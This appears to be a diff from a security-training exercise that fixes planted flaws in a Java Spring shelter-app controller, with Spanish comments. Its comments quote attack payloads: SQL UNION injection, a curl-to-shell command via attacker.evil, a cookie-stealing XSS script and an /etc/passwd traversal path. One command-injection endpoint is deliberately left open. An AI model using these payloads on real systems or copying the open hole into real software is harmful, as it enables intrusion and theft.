@@ -6,9 +6,12 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.util.HtmlUtils;
 
 import javax.servlet.http.HttpSession;
-import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.List;
@@ -50,7 +53,7 @@ public class ShelterController {
                      "SELECT password_hash FROM volunteers WHERE username = ?")) {
             ps.setString(1, username);
             ResultSet rs = ps.executeQuery();
-            if (rs.next() && rs.getString(1).equals(DatabaseUtil.md5(password))) {
+            if (rs.next() && DatabaseUtil.checkPassword(password, rs.getString(1))) { // [FIX VULN-4]
                 session.setAttribute("user", username);
                 return "redirect:/dashboard";
             }
@@ -78,29 +81,32 @@ public class ShelterController {
     }
 
     // -------------------------------------------------------------------
-    // [VULN-1] CWE-89: SQL Injection
-    // El término de búsqueda se concatena directamente en la consulta SQL
-    // en lugar de usar PreparedStatement con parámetros. Un input como:
-    //     ' UNION SELECT username, password_hash, 1 FROM volunteers --
-    // permite extraer credenciales de otra tabla desde el buscador de
-    // mascotas, sin ninguna autenticación previa.
+    // [FIX VULN-1] CWE-89: SQL Injection — corregido en Ronda 1
+    // Se reemplazó la concatenación de `q` dentro del SQL por un
+    // PreparedStatement con parámetro (`?`). El driver JDBC se encarga de
+    // escapar el valor, por lo que `q` ya no puede alterar la estructura
+    // de la consulta (p. ej. un UNION SELECT ya no funciona).
+    // Cierra también el hallazgo de SonarQube "dynamically formatted SQL
+    // query" reportado sobre esta misma línea.
     // -------------------------------------------------------------------
     @GetMapping("/search")
     public String search(@RequestParam(defaultValue = "") String q, Model model) {
         List<String[]> results = new ArrayList<>();
-        String sql = "SELECT id, name, species, notes FROM pets WHERE name LIKE '%" + q + "%'"; // [VULN-1]
+        String sql = "SELECT id, name, species, notes FROM pets WHERE name LIKE ?"; // [FIX VULN-1]
 
         try (Connection conn = DatabaseUtil.getConnection();
-             Statement st = conn.createStatement()) {
-            ResultSet rs = st.executeQuery(sql);                                                  // [VULN-1]
+             PreparedStatement ps = conn.prepareStatement(sql)) {                    // [FIX VULN-1]
+            ps.setString(1, "%" + q + "%");                                          // [FIX VULN-1]
+            ResultSet rs = ps.executeQuery();
             while (rs.next()) {
                 results.add(new String[]{
                         rs.getString(1), rs.getString(2), rs.getString(3), rs.getString(4)
                 });
             }
-        } catch (SQLException ignored) {
-            // se ignora a propósito para no filtrar el stacktrace, pero la
-            // inyección ya ocurrió en la construcción del SQL de arriba
+        } catch (SQLException e) {
+            // ya no se ignora en silencio: se registra para diagnóstico,
+            // sin exponer el stacktrace al usuario final
+            System.err.println("Error en /search: " + e.getMessage());
         }
 
         model.addAttribute("results", results);
@@ -109,40 +115,51 @@ public class ShelterController {
     }
 
     // -------------------------------------------------------------------
-    // [VULN-2] CWE-78: OS Command Injection
-    // Genera un "reporte veterinario" usando el nombre de la mascota
-    // directamente dentro de un comando de shell. Un nombre malicioso
-    // como:
-    //     Firulais; curl http://attacker.evil/x.sh | sh
-    // ejecuta comandos arbitrarios en el servidor con los privilegios del
-    // proceso Java. No hay validación ni uso de ProcessBuilder con lista
-    // de argumentos separados.
+    // [VULN-2] CWE-78/88: Command Argument Injection — SIGUE ABIERTA
+    // (se corrige en la Ronda 2, no en esta). Se deja el comportamiento
+    // original para no adelantar esa corrección.
+    //
+    // [FIX] Reflected XSS (hallazgo no planeado de SonarQube, Blocker) —
+    // corregido en esta Ronda 1. Antes, `petName` se devolvía tal cual en
+    // el cuerpo de la respuesta HTTP (@ResponseBody, sin pasar por el
+    // motor de plantillas), por lo que un valor como
+    //     <script>document.location='http://attacker.evil/steal?c='+document.cookie</script>
+    // se reflejaba sin escapar. Ahora se escapa con HtmlUtils.htmlEscape
+    // antes de incluirlo en la respuesta.
     // -------------------------------------------------------------------
     @PostMapping("/generate-report")
     @ResponseBody
     public String generateReport(@RequestParam String petName) throws Exception {
         String command = "sh -c \"echo Reporte veterinario de " + petName +
-                " > /tmp/report_" + petName + ".txt\"";                       // [VULN-2]
-        Runtime.getRuntime().exec(command);                                   // [VULN-2]
-        return "Reporte generado para " + petName;
+                " > /tmp/report_" + petName + ".txt\"";                       // [VULN-2] pendiente Ronda 2
+        Runtime.getRuntime().exec(command);                                   // [VULN-2] pendiente Ronda 2
+        String safePetName = HtmlUtils.htmlEscape(petName);                   // [FIX XSS]
+        return "Reporte generado para " + safePetName;                       // [FIX XSS]
     }
 
     // -------------------------------------------------------------------
-    // [VULN-5] CWE-22: Path Traversal / Improper Limitation of a Pathname
-    // Permite descargar fotos/documentos de mascotas por nombre de
-    // archivo, pero no valida ni normaliza el path. Un request como:
-    //     /download?file=../../../../etc/passwd
-    // escapa del directorio uploads/ y lee cualquier archivo accesible
-    // por el proceso Java.
+    // [FIX VULN-5] CWE-22: Path Traversal — corregido en Ronda 1
+    // Se resuelve `file` contra el directorio base con Path.resolve() y
+    // se normaliza con normalize() para colapsar secuencias "..". Luego
+    // se verifica explícitamente que la ruta resultante siga estando
+    // DENTRO de UPLOAD_DIR (startsWith sobre las rutas absolutas). Si el
+    // intento de escape se detecta, se responde 400 en vez de revelar si
+    // el archivo objetivo existe o no, lo que también cierra el hallazgo
+    // "Filesystem Oracle" reportado por SonarQube sobre este endpoint.
     // -------------------------------------------------------------------
     @GetMapping("/download")
     @ResponseBody
     public ResponseEntity<Resource> download(@RequestParam String file) {
-        File target = new File(UPLOAD_DIR + file);                            // [VULN-5] sin normalizar/validar
-        if (!target.exists()) {
+        Path baseDir = Paths.get(UPLOAD_DIR).toAbsolutePath().normalize();     // [FIX VULN-5]
+        Path target = baseDir.resolve(file).normalize();                      // [FIX VULN-5]
+
+        if (!target.startsWith(baseDir)) {                                    // [FIX VULN-5]
+            return ResponseEntity.badRequest().build();
+        }
+        if (!Files.exists(target)) {
             return ResponseEntity.notFound().build();
         }
-        Resource resource = new FileSystemResource(target);
+        Resource resource = new FileSystemResource(target.toFile());
         return ResponseEntity.ok(resource);
     }
 }
